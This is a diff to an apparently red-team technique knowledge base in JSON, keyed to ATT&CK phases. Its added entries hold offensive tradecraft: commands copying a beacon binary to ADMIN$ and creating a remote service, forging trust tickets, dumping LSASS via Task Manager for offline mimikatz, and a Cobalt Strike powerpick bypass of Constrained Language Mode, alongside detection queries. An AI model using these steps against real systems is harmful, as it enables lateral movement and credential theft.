@@ -931,7 +931,7 @@
         "ttp": "T1087",
         "external": false,
         "description": "Find users",
-        "content": "# User enum\n\n## Tools\n########\n########",
+        "content": "",
         "category": "Internal Reconnaissance",
         "stealthy": false,
         "changes": [
@@ -952,7 +952,7 @@
     },
     {
         "id": "72938e82-6c59-4cc9-bad0-96609d5f5362",
-        "name": "Vulnerable Machines",
+        "name": "Identify Machines",
         "phase": "02. Reconnaissance",
         "ttp": "T1595.001",
         "external": false,
@@ -1104,6 +1104,22 @@
         "steps": []
     },
     {
+        "id": "248fe325-396d-4c4e-9243-323f435e5ca9",
+        "name": "Remote Users",
+        "phase": "03. Host Enumeration",
+        "ttp": "T1000",
+        "external": false,
+        "description": "Identify Users Remotely",
+        "content": "",
+        "category": "",
+        "stealthy": false,
+        "changes": [
+            ""
+        ],
+        "tools": [],
+        "steps": []
+    },
+    {
         "id": "248fe325-396d-4c4e-9243-323fb35e5ca9",
         "name": "PowerShell Logging",
         "phase": "03. Host Enumeration",
@@ -1114,7 +1130,7 @@
         "category": "Auditing",
         "stealthy": false,
         "changes": [
-            "\n## [[reg]]\n#get_powershell_logging\n```ps\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription\n \nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging\n\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\n```"
+            "\n## Script Block Logging\nIf the environment has script block logging enabled, even if we are obfuscating our PowerShell code, before it’s executed by the PowerShell engine, it’s going to be de- obfuscated and logged to the event log in 4104.\n\n## System-wide transcript file\nIf the environment has 'system-wide transcript file' enabled, a share on the network will exist where everything typed in PowerShell (transcript file) will be sent to that network share.\n\n#get_powershell_logging\n```ps\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription\n \nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging\n\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\n```"
         ],
         "tools": [
             "reg",
@@ -2040,8 +2056,22 @@
         "phase": "07. Lateral Movement",
         "ttp": "T1021.006",
         "external": false,
-        "description": "Get Persistence via Teams DLL hijacking",
-        "content": "# PsExec\n\n## Detection\nTo build a detection, the following markers can be used:\n-   File creation.\n-   Service installed.\n-   Process start.\n\nCobalt Strike has a few default behaviours that we can profile:\n-   It uses the same name for the service and the exe.\n-   The name is a random alphanumeric string of length 7.\n-   The service binary is always dropped into `C:\\Windows`.\n\nFurthermore, `psexec` and `psexec64` are the only `jump` methods that will perform a process migration automatically (by default into `rundll32.exe`) in order to delete the binary. It's parent process will be the service binary and would result in a further process create event.\nWith psexec/64, the service filename is always a UNC path (e.g. `\\\\srv1\\ADMIN$\\fe80480.exe`). \n\n`psexec_psh` will execute PowerShell via `%COMSPEC%` (resulting in the command line interpreter, usually `cmd.exe`).\nIf psexec_psh is used, the filepath will be `%COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand ba`.\n\n>event.module : sysmon and event.type : creation and event.category : file and file.extension : exe and file.directory : \"C:\\\\Windows\"\n\nFind the associated service.\n\n>event.provider : \"Service Control Manager\" and message : \"A service was installed\"\n\n\n## Tools\n########\n########",
+        "description": "",
+        "content": "1. Upload a service binary to the ADMIN$ share via SMB\n2. Create a service on the remote machine with the binpath pointing to the payload\n3. Start the service\n4. When done, clean up by stopping the service and deleting the binary\n\n```cmd\ncopy sv_beacon.exe \\srv1\\ADMIN$\nsc \\srv1 create mal_service binPath='C:\\Windows\\sv_beacon.exe'\ndel \\srv1\\ADMIN$\\sv_beacon.exe\n```\n## Detection\nTo build a detection, the following markers can be used:\n-   File creation.\n-   Service installed.\n-   Process start.\n\nCobalt Strike has a few default behaviours that we can profile:\n-   It uses the same name for the service and the exe.\n-   The name is a random alphanumeric string of length 7.\n-   The service binary is always dropped into `C:\\Windows`.\n\nFurthermore, `psexec` and `psexec64` are the only `jump` methods that will perform a process migration automatically (by default into `rundll32.exe`) in order to delete the binary. It's parent process will be the service binary and would result in a further process create event.\nWith psexec/64, the service filename is always a UNC path (e.g. `\\\\srv1\\ADMIN$\\fe80480.exe`). \n\n`psexec_psh` will execute PowerShell via `%COMSPEC%` (resulting in the command line interpreter, usually `cmd.exe`).\nIf psexec_psh is used, the filepath will be `%COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand ba`.\n\n>event.module : sysmon and event.type : creation and event.category : file and file.extension : exe and file.directory : 'C:\\\\Windows'\n\nFind the associated service.\n\n>event.provider : 'Service Control Manager' and message : 'A service was installed'\n\n\n## Tools\n########\n########",
+        "category": "",
+        "stealthy": false,
+        "changes": [],
+        "tools": [],
+        "steps": []
+    },
+    {
+        "id": "3cff90c1-567c-4a22-a2f7-127a2ca5873e",
+        "name": "SMB Remote Exec",
+        "phase": "07. Lateral Movement",
+        "ttp": "T1021.006",
+        "external": false,
+        "description": "",
+        "content": "Use SMB to gain access to another workstation",
         "category": "",
         "stealthy": false,
         "changes": [],
@@ -2398,7 +2428,7 @@
         "ttp": "T1003.001",
         "external": false,
         "description": "NoDescription",
-        "content": "# LogonPasswords\nThis feature retrieves NTLM hashes which can be used with [[Pass-the-Hash]] or cracking to recover the plain-text.\n\n#OPSEC A lot of tradecraft that leverages NTLM are undesirable.\n-   [[Pass-the-Hash]] requires patching LSASS.\n-   [[Overpass-the-Hash]] with NTLM uses a weaker encryption compared to what Windows uses by default.\n\n-> Better use [[eKeys]] to get the AES and [[Overpass-the-Hash]]\n\n## Tools\n########\n########",
+        "content": "# LogonPasswords\nThis feature retrieves NTLM hashes which can be used with [[Pass-the-Hash]] or cracking to recover the plain-text.\n\n#OPSEC A lot of tradecraft that leverages NTLM are undesirable.\n-   [[Pass-the-Hash]] requires patching LSASS.\n-   [[Overpass-the-Hash]] with NTLM uses a weaker encryption compared to what Windows uses by default.\n\n-> Better use [[eKeys]] to get the AES and [[Overpass-the-Hash]]\n\nOr just dump it via TASKMANAGER and exfiltrate it to then run mimikatz on it locally!",
         "category": "",
         "stealthy": false,
         "changes": [
@@ -2463,6 +2493,20 @@
         "external": false,
         "description": "NoDescription",
         "content": "",
+        "category": "",
+        "stealthy": false,
+        "changes": [],
+        "tools": [],
+        "steps": []
+    },
+    {
+        "id": "7f22df56-6eed-4862-b871-675bcbcdc8b5",
+        "name": "Trust Ticket",
+        "phase": "08. Credentials & User Impersonation",
+        "ttp": "T1003.003",
+        "external": false,
+        "description": "NoDescription",
+        "content": "1. Get inter-realm key which is responsible for cross forest TGT signing\n2. Forge a Trust Ticket for another domain\n3. Get TGS\n> .\\asktgs path_trust_ticket cifs/dc_of_ext_domain\n\nℹ It should be noted that the targeted domain must have explicit permissions set for groups or users in the trusted domain, something which is not uncommon.\n",
         "category": "",
         "stealthy": false,
         "changes": [],
@@ -2632,7 +2676,7 @@
         "ttp": "T1000",
         "external": false,
         "description": "NoDescription",
-        "content": "# Group Policy (GPO) \nGroup Policy Objects are collections of controls bound to computers or users within a OU.\n\nAny domain user can read the GPOs and its permissions\n-   Create GPOs\n-   Modify existing GPOs\n-   Link GPOs to OUs\n\n## Identify\nIf installed use the native GPO report commands `Get-GPOReport` and `gpresult` utility. It can be exported and viewed as HTML. If not availabel use [[Dump GPOs]]\n\n## Abuse\nWe can abuse these by modifying existing GPOs or creating and linking new GPOs to gain code execution or otherwise manipulate computer configurations.\n- [[PowerView#Create new GPOs]]\n- [[PowerView#Link GPOs]]\n- [[PowerView#WriteProperty, WriteDacl, WriteOwner]]\n\n\n## Tools\n########\n########",
+        "content": "# Group Policy (GPO) \nGroup Policy Objects are collections of controls bound to computers or users within a OU.\n\nAny domain user can read the GPOs and its permissions\n-   Create GPOs\n-   Modify existing GPOs\n-   Link GPOs to OUs\n\n## Identify\nIf installed use the native GPO report commands `Get-GPOReport` and `gpresult` utility. It can be exported and viewed as HTML. If not availabel use [[Dump GPOs]]\n\n## Abuse\nWe can abuse these by modifying existing GPOs or creating and linking new GPOs to gain code execution or otherwise manipulate computer configurations.\n- [[PowerView#Create new GPOs]]\n- [[PowerView#Link GPOs]]\n- [[PowerView#WriteProperty, WriteDacl, WriteOwner]]\n\n\n## Watch for\n* PowerShell logging policy\n* Full auditing policy\n* Prevent local account at logon\n* Add server admin to local administrator gorup\n* Enhanced Mitigation Experience Toolkit (EMET) configuration\n* AppLocker configuration",
         "category": "",
         "stealthy": false,
         "changes": [
@@ -3197,6 +3241,20 @@
         "description": "NoDescription",
         "content": "# PowerShell Constrained Language Mode\nWhen AppLocker is enabled PowerShell is placed into Constrained Language Mode (CLM), which restricts it to core types.\n\n## Show language mode of CLM\n> $ExecutionContext.SessionState.LanguageMode\n\n> beacon> remote-exec winrm dc-1 $ExecutionContext.SessionState.LanguageMode\n\nAny AppLocker bypass can result in CLM bypass. Cobalt Strike has a `powerpick` command, which is an \"unmanaged\" implementation of tapping into a PowerShell runspace, without using `powershell.exe`.\n\n```beacon\nbeacon> run hostname\ndc-1\n\nbeacon> powershell $ExecutionContext.SessionState.LanguageMode\nConstrainedLanguage\n\nbeacon> powershell [math]::Pow(2,10)\n<Objs Version=\"1.1.0.1\" xmlns=\"http://schemas.microsoft.com/powershell/2004/04\"><S S=\"Error\">Cannot invoke method. Method invocation is supported only on core types in this language mode._x000D__x000A_</S><S S=\"Error\">At line:1 char:1_x000D__x000A_</S><S S=\"Error\">+ [math]::Pow(2,10)_x000D__x000A_</S><S S=\"Error\">+ ~~~~~~~~~~~~~~~~~_x000D__x000A_</S><S S=\"Error\">    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException_x000D__x000A_</S><S S=\"Error\">    + FullyQualifiedErrorId : MethodInvocationNotSupportedInConstrainedLanguage_x000D__x000A_</S><S S=\"Error\"> _x000D__x000A_</S></Objs>\n\nbeacon> powerpick $ExecutionContext.SessionState.LanguageMode\nFullLanguage\n\nbeacon> powerpick [math]::Pow(2,10)\n1024\n```\n\n\n## Tools\n########\n########",
         "category": "",
+        "stealthy": false,
+        "changes": [],
+        "tools": [],
+        "steps": []
+    },
+    {
+        "id": "bf4730e9-d50b-455f-86a1-c502ba175b7a",
+        "name": "Device Guard",
+        "phase": "03. Host Enumeration",
+        "ttp": "T1000",
+        "external": false,
+        "description": "NoDescription",
+        "content": "# Windows Defender Application Control and virtualization-based protection of code integrity \n## Windows Defender Application Control\n## Microsoft Defender Application Guard",
+        "category": "Protections",
         "stealthy": false,
         "changes": [],
         "tools": [],
